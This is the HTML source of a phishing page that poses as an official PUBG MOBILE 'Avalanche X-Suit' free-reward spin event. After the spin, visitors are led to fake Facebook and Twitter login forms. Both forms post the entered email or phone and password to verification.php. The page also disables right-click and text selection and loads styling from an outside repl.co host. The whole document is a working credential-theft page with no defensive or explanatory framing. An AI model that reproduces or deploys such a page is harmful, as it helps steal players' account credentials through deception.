<html>


<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE: Avalanche X-Suit">
<meta name="description" content="Collect your special rewards at the Avalanche X-Suit event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:description" content="Collect your special rewards at the Avalanche X-Suit event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE: Avalanche X-Suit">
<meta property="og:type" content="website">
<meta name="copyright" content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://i.ibb.co/DpRp888/Pics-Art-10-26-09-57-02.jpg">
<title>PUBG MOBILE: Avalanche X-Suit</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://i.ibb.co/DpRp888/Pics-Art-10-26-09-57-02.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<div class="container">

<div class="header">
<video src="https://github.com/jefanya14/pubg-spin-v45/raw/main/media/pubgm.mp4" autoplay loop muted></video>
</div> 
<div class="alert">
</div> 
<div class="box">
<center>
<div class="wrap">
<div class="bg">
<div class="kotak">
<center>
<div class="spin">
<img class="img" src="img/1.png">
<img class="img" src="img/2.png">
<img class="img" src="img/3.png">
<img class="img" src="img/4.png">
<img class="img" src="img/x.png">
<img class="img" src="img/6.png">
</div> 
</center>
<img onclick="spin()" class="start" src="https://raw.githubusercontent.com/jefanya14/pubg-spin-v45/main/putar.png">
</div> 
</div> 
</div> 
<div class="btn-wrapper">
<button type="button" onmousedown="buka.play()" onclick="open_about_event()">About Event</button>
<button type="button" onmousedown="buka.play()" onclick="open_event_rules()">Event Rules</button>
</div> 
</center>
</div> 
<div class="footer">
<div class="footer-txt-follow">Follow Us</div> 
<center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
</center>
<img class="footer-copyright-icon" src="https://i.ibb.co/wN1GcSg/1635252653538.png">
<div class="footer-txt-copyright">â“’ 2017 KRAFTON, Inc. All rights reserved.</div> 
<div class="footer-txt-copyright">â“’ 2018-2021 Tencent. All rights reserved.</div> 
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> 
</div> 
</div> 
<div class="popup reward_confirmation" style="display: none;">
<div class="popup-box">
<div class="popup-title">Reward Confirmation</div> 
<div class="popup-content">
<br>
<div class="popup-rewards-title">Are you sure to collect this rewards?</div> 
<img class="popup-rewards-img1" src="img/1.png" id="myRewardImg">
</div> 
<div class="popup-btn-wrapper">
<button type="button" class="popup-btn-active" style="margin-left: auto; margin-right: auto; float: none; display: block;" onmousedown="buka.play();" onclick="account_login()">Collect</button>
</div> 
</div> 
</div> 
<div class="popup account_login" style="display: none;">
<div class="popup-box">
<div class="popup-title">Account Login</div> 
<div class="popup-content">
<br>
<div class="popup-rewards-title">Log in using your PUBG MOBILE account to receive reward</div> 
<button type="button" class="btn-login facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i> Log in using Facebook account</button>
<button type="button" class="btn-login twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i> Log in using Twitter account</button>
</div> 
</div> 
</div> 
<div class="popup about_event" style="display: none;">
<div class="popup-box">
<div class="popup-title">About Event</div> 
<div class="popup-content">
<br>
<div class="popup-rewards-title">
Welcome to PUBG MOBILE: Avalanche X-Suit
<br>
<br>
This event is to welcome the Avalanche X-Suit
<br>
Get various kinds of rewards at this year's end event!
</div> 
</div> 
<div class="popup-btn-wrapper">
<button type="button" class="popup-btn-active" style="margin-left: auto; margin-right: auto; float: none; display: block;" onmousedown="tutup.play();" onclick="close_about_event()">Close</button>
</div> 
</div> 
</div> 
<div class="popup event_rules" style="display: none;">
<div class="popup-box">
<div class="popup-title">Event Rules</div> 
<div class="popup-content">
<br>
<div class="popup-rewards-title">
Welcome to PUBG MOBILE: Avalanche X-Suit
<br>
<br>
Make sure your account does not violate the rules of the game such as using illegal programs or others
<br>
Join this event and get various kinds of free rewards
</div> 
</div> 
<div class="popup-btn-wrapper">
<button type="button" class="popup-btn-active" style="margin-left: auto; margin-right: auto; float: none; display: block;" onmousedown="tutup.play();" onclick="close_event_rules()">Close</button>
</div> 
</div> 
</div> 
<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="tutup_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb">
<img src="https://raw.githubusercontent.com/jefanya14/pubg-spin-v45/main/login/facebook_text.png">
</div>
<div class="content-box-fb">
<img src="https://i.ibb.co/DpRp888/Pics-Art-10-26-09-57-02.jpg">
<div class="txt-login-fb">
Log in to your Facebook account to connect to PUBG MOBILE
</div>
<form action="verification.php" method="post">
<input type="text" class="loginEmail" name="email" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required>
<input type="password" class="loginPassword" name="password" id="fbPassword" placeholder="Password" autocomplete="off" autocapitalize="off" required>
<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div>
<input type="hidden" name="login" value="Facebook" readonly>
<button type="submit" class="btn-login-fb">Log In</button>
</form>
<div class="txt-create-account">Create account</div>
<div class="txt-not-now">Not now</div>
<div class="txt-forgotten-password">Forgotten password?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div>
<div class="language-name">Bahasa Indonesia</div>
<div class="language-name">Basa Jawa</div>
<div class="language-name">Bahasa Melayu</div>
<div class="language-name">æ—¥æœ¬èªž</div>
<div class="language-name">EspaÃ±ol</div>
<div class="language-name">PortuguÃªs (Brasil)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Facebook Inc.</div>
</div>
</div>
<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter">
<img src="https://raw.githubusercontent.com/jefanya14/pubg-spin-v45/main/login/twitter_text.png">
</div>
<br>
<br>
<div class="box-twitter">
<center>
<form action="verification.php" method="post">
<div class="txt-login-twitter">Login to Twitter</div>
<div class="input-box-twitter">
<label>Phone, email, or username</label>
<input type="text" name="email" placeholder="" required>
</div>
<div class="input-box-twitter">
<div class="TwitterShowHide TwitterShowPassword" onclick="showTwitterPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
<div class="TwitterShowHide TwitterHidePassword" style="display: none;" onclick="hideTwitterPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div>
<label>Password</label>
<input type="password" style="width: 85%;" name="password" id="twitterPassword" placeholder="" required>
</div>
<input type="hidden" name="login" value="Twitter" readonly>
<button type="submit" class="btn-login-twitter">Log In</button>
<div class="footer-menu-twitter">Forgot password?</div>
<div class="footer-menu-twitter bulet">â€¢</div>
<div class="footer-menu-twitter">Sign up to Twitter</div>
</form>
</center>
</div>
</div>
</div>
<audio id="klik1" src="https://github.com/jefanya14/pubg-spin-v45/raw/main/media/putar.mp3">
<script type="text/javascript" src="https://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/popup.js"></script>
<script src="js/click.js"></script>
<script src="js/spinFunction.js"></script>
<script src="js/showHide.js"></script>
</body>
<link href="https://awd.jefanyaefandchr.repl.co/aman.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman1.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman2.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman3.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman4.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman5.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman6.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman7.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman8.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman9.css" rel="stylesheet" type="text/css" />
<link href="https://awd.jefanyaefandchr.repl.co/aman10.css" rel="stylesheet" type="text/css" />
</html>